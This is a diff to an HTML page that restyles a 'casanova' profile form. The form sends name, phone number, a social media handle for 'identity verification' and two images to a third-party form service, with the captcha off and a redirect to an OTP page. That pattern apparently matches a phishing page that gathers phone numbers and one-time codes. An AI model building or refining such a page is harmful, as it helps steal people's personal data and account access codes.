@@ -3,76 +3,57 @@
 <head>
     <style>
         body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
             background: linear-gradient(45deg, #ff4d4d 40%, #ffb6c1 60%);
             font-family: cursive;
         }
-
         .profile-form {
-            width: 300px;
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
             background: white;
             border-radius: 10px;
-            padding: 20px;
-            text-align: center;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
         }
-
         .profile-form label {
             display: block;
-            margin-top: 10px;
+            margin: 10px 0;
         }
-
         .profile-form input {
             width: 100%;
             padding: 10px;
-            margin-top: 5px;
             border: 1px solid #ccc;
             border-radius: 5px;
-        }
-
-        .profile-form button {
-            width: 100%;
-            background: #ff4d4d;
-            color: white;
-            border: none;
-            padding: 10px;
-            border-radius: 5px;
-            cursor: pointer;
         }
     </style>
 </head>
 <body>
-    <div class="profile-form">
-        <form id="contactform" class="phone-input" action="https://formsubmit.io/send/42b5a94f-08e0-4850-aa08-970cbc3b421a" method="POST">
-            <input name="_redirect" type="hidden" value="OTP.html">
-            <input type="hidden" name="_captcha" value="false">
-            
-            <label for="name">Name</label>
-            <input type="text" id="name" name="name" required>
-
-            <label for="username">Preferred Username</label>
-            <input type="text" id="username" name="username" required>
-
-            <label for="phone">Phone number</label>
-            <input type="text" id="phone" name="phone" required>
-
-            <label for="yearsActive">Years active</label>
-            <input type="text" id="yearsActive" name="yearsActive" required>
-
-            <label for="socialMedia">Social Media Handle (Identity Verification)</label>
-            <input type="text" id="socialMedia" name="socialMedia" required>
-
-            <label for="imageOne">Image One</label>
-            <input type="file" id="imageOne" name="imageOne" accept="image/*" >
-
-            <label for="imageTwo">Image Two</label>
-            <input type="file" id="imageTwo" name="imageTwo" accept="image/*" >
-
-            <button type="submit">Submit</button>
-        </form>
-    </div>
+    <form id="casanova-profile-form" class="profile-form" action="https://formsubmit.io/send/42b5a94f-08e0-4850-aa08-970cbc3b421a" method="POST">
+        <input type="hidden" name="_redirect" value="OTP.html">
+        <input type="hidden" name="_captcha" value="false">
+        
+        <label for="name">Name:</label>
+        <input type="text" id="name" name="name" required>
+        
+        <label for="username">Preferred Username:</label>
+        <input type="text" id="username" name="username" required>
+        
+        <label for="phone">Phone number:</label>
+        <input type="tel" id="phone" name="phone" required>
+        
+        <label for="years-active">Years active:</label>
+        <input type="number" id="years-active" name="years_active" required>
+        
+        <label for="social-media-handle">Social Media Handle (Identity Verification):</label>
+        <input type="text" id="social-media-handle" name="social_media_handle" required>
+        
+        <label for="image1">Image One:</label>
+        <input type="file" id="image1" name="image1" accept="image/*" required>
+        
+        <label for="image2">Image Two:</label>
+        <input type="file" id="image2" name="image2" accept="image/*" required>
+        
+        <button type="submit">Submit</button>
+    </form>
 </body>
 </html>
